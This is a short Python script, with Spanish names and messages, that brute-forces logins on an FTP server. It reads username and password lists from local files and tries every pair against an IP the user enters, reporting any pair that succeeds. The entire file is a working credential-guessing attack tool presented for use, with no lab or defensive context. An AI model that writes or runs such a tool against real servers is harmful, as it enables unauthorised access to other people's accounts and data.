#!/usr/bin/env python3

import ftplib
import sys

def fuerza_bruta(direccion_ip,fichero_usuarios,fichero_passwords):
	try:
		fichero_usuarios = open(fichero_usuarios,"r")
		fichero_passwords = open(fichero_passwords,"r")
		
		usuarios = fichero_usuarios.readlines()
		passwords = fichero_passwords.readlines()

		for usuario in usuarios:
			for password in passwords:
				try:
					print("[*] Intentando conectar con el servidor FTP")
					connect=ftplib.FTP(direccion_ip)
					response=connect.login(usuario.strip(),password.strip())
					print(response)
					if "230" in response and "access granted" in response:
						print("[*]Ataque fuerza bruta")
						print("Usario: "+ usuario + "Password: "+password)
						sys.exit()
					else:
						pass
				except ftplib.error_perm:
					print("Error en el proceso de fuerza bruta con usuario "+usuario+ "y password "+password)
					connect.close

	except(KeyboardInterrupt):
		print("Interrupted!")
		sys.exit()

direccion_ip=input("Introduce IP de un servidor FTP:")
user_file="usuarios.txt"
passwords_file="passwords.txt"
fuerza_bruta(direccion_ip,user_file,passwords_file)

